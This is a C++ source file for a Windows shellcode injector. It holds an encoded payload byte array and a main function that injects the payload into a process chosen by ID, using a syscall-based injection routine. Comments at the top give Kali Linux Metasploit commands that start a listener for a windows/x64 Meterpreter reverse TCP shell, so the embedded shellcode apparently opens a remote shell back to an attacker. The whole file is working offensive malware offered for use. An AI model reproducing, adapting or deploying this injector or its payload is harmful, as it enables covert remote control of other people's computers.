#include <Windows.h>
#include <iostream>


//IMPORTANT: COMMANDS TO USE IN KALI LINUX
//USE:msfconsole
//USE:exploit/multi/handler
//USE:SET LHOST eth0
//USE:SET LPORT 443
//USE:set payload windows/x64/meterpreter/reverse_tcp
//USE:run -j


bool NT_injection(_In_ const char* process_id, _In_ const unsigned char* payload, _In_ SIZE_T payload_size);
bool syscall_injection(_In_ const char* process_id, _In_  unsigned char* payload, _In_ SIZE_T payload_size);
int main(int argc, char* argv[]) {
	using std::cout;
	using std::endl;
	 UCHAR shellcode[] =
		 "\xa5\x11\xda\xbd\xa9\xb1\x95\x59\x59\x59\x18\x08\x18\x09"
		 "\x0b\x08\x0f\x11\x68\x8b\x3c\x11\xd2\x0b\x39\x11\xd2\x0b"
		 "\x41\x11\xd2\x0b\x79\x11\xd2\x2b\x09\x11\x56\xee\x13\x13"
		 "\x14\x68\x90\x11\x68\x99\xf5\x65\x38\x25\x5b\x75\x79\x18"
		 "\x98\x90\x54\x18\x58\x98\xbb\xb4\x0b\x18\x08\x11\xd2\x0b"
		 "\x79\xd2\x1b\x65\x11\x58\x89\x3f\xd8\x21\x41\x52\x5b\x56"
		 "\xdc\x2b\x59\x59\x59\xd2\xd9\xd1\x59\x59\x59\x11\xdc\x99"
		 "\x2d\x3e\x11\x58\x89\x09\x1d\xd2\x19\x79\xd2\x11\x41\x10"
		 "\x58\x89\xba\x0f\x14\x68\x90\x11\xa6\x90\x18\xd2\x6d\xd1"
		 "\x11\x58\x8f\x11\x68\x99\x18\x98\x90\x54\xf5\x18\x58\x98"
		 "\x61\xb9\x2c\xa8\x15\x5a\x15\x7d\x51\x1c\x60\x88\x2c\x81"
		 "\x01\x1d\xd2\x19\x7d\x10\x58\x89\x3f\x18\xd2\x55\x11\x1d"
		 "\xd2\x19\x45\x10\x58\x89\x18\xd2\x5d\xd1\x18\x01\x18\x01"
		 "\x11\x58\x89\x07\x00\x03\x18\x01\x18\x00\x18\x03\x11\xda"
		 "\xb5\x79\x18\x0b\xa6\xb9\x01\x18\x00\x03\x11\xd2\x4b\xb0"
		 "\x12\xa6\xa6\xa6\x04\x10\xe7\x2e\x2a\x6b\x06\x6a\x6b\x59"
		 "\x59\x18\x0f\x10\xd0\xbf\x11\xd8\xb5\xf9\x58\x59\x59\x10"
		 "\xd0\xbc\x10\xe5\x5b\x59\x58\xe2\x99\xf1\x58\x03\x18\x0d"
		 "\x10\xd0\xbd\x15\xd0\xa8\x18\xe3\x15\x2e\x7f\x5e\xa6\x8c"
		 "\x15\xd0\xb3\x31\x58\x58\x59\x59\x00\x18\xe3\x70\xd9\x32"
		 "\x59\xa6\x8c\x33\x53\x18\x07\x09\x09\x14\x68\x90\x14\x68"
		 "\x99\x11\xa6\x99\x11\xd0\x9b\x11\xa6\x99\x11\xd0\x98\x18"
		 "\xe3\xb3\x56\x86\xb9\xa6\x8c\x11\xd0\x9e\x33\x49\x18\x01"
		 "\x15\xd0\xbb\x11\xd0\xa0\x18\xe3\xc0\xfc\x2d\x38\xa6\x8c"
		 "\xdc\x99\x2d\x53\x10\xa6\x97\x2c\xbc\xb1\xca\x59\x59\x59"
		 "\x11\xda\xb5\x49\x11\xd0\xbb\x14\x68\x90\x33\x5d\x18\x01"
		 "\x11\xd0\xa0\x18\xe3\x5b\x80\x91\x06\xa6\x8c\xda\xa1\x59"
		 "\x27\x0c\x11\xda\x9d\x79\x07\xd0\xaf\x33\x19\x18\x00\x31"
		 "\x59\x49\x59\x59\x18\x01\x11\xd0\xab\x11\x68\x90\x18\xe3"
		 "\x01\xfd\x0a\xbc\xa6\x8c\x11\xd0\x9a\x10\xd0\x9e\x14\x68"
		 "\x90\x10\xd0\xa9\x11\xd0\x83\x11\xd0\xa0\x18\xe3\x5b\x80"
		 "\x91\x06\xa6\x8c\xda\xa1\x59\x24\x71\x01\x18\x0e\x00\x31"
		 "\x59\x19\x59\x59\x18\x01\x33\x59\x03\x18\xe3\x52\x76\x56"
		 "\x69\xa6\x8c\x0e\x00\x18\xe3\x2c\x37\x14\x38\xa6\x8c\x10"
		 "\xa6\x97\xb0\x65\xa6\xa6\xa6\x11\x58\x9a\x11\x70\x9f\x11"
		 "\xdc\xaf\x2c\xed\x18\xa6\xbe\x01\x33\x59\x00\xe2\xb9\x44"
		 "\x73\x53\x18\xd0\x83\xa6\x8c";


	//cout << "starting nt_injection" << endl;
	//if (!NT_injection(argv[1], shellcode, sizeof(shellcode))) {
		//cout<<"failed to use nt injection method, aborting"<<endl;
		//return 1;
	//}
	cout << "starting syscall injection" << endl;
	if (!syscall_injection(argv[1], shellcode, sizeof(shellcode))) {
		cout << "failed to use syscall injection" << endl;
		return 1;
	}

	return 0;
}